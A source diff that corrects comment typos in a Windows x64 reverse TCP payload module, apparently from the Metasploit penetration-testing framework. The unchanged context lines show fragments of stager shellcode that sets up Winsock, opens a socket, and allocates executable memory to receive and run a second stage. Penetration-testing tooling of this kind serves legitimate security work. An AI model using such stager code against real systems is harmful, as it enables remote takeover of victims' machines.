@@ -124,7 +124,7 @@ module Payload::Windows::ReverseTcp_x64
         call rbp                ; LoadLibraryA( "ws2_32" )
 
       ; perform the call to WSAStartup...
-        mov rdx, r13            ; second param is a pointer to this stuct
+        mov rdx, r13            ; second param is a pointer to this struct
         push 0x0101             ;
         pop rcx                 ; set the param for the version requested
         mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
@@ -136,7 +136,7 @@ module Payload::Windows::ReverseTcp_x64
 
       create_socket:
       ; perform the call to WSASocketA...
-        push rax                ; if we succeed, rax wil be zero, push zero for the flags param.
+        push rax                ; if we succeed, rax will be zero, push zero for the flags param.
         push rax                ; push null for reserved parameter
         xor r9, r9              ; we do not specify a WSAPROTOCOL_INFO structure
         xor r8, r8              ; we do not specify a protocol
@@ -179,7 +179,7 @@ module Payload::Windows::ReverseTcp_x64
     end
 
     asm << %Q^
-      ; this  lable is required so that reconnect attempts include
+      ; this label is required so that reconnect attempts include
       ; the UUID stuff if required.
       connected:
     ^
@@ -226,7 +226,7 @@ module Payload::Windows::ReverseTcp_x64
         pop r9                  ; PAGE_EXECUTE_READWRITE
         push 0x1000             ;
         pop r8                  ; MEM_COMMIT
-        mov rdx, rsi            ; the newly recieved second stage length.
+        mov rdx, rsi            ; the newly received second stage length.
         xor rcx, rcx            ; NULL as we dont care where the allocation is.
         mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
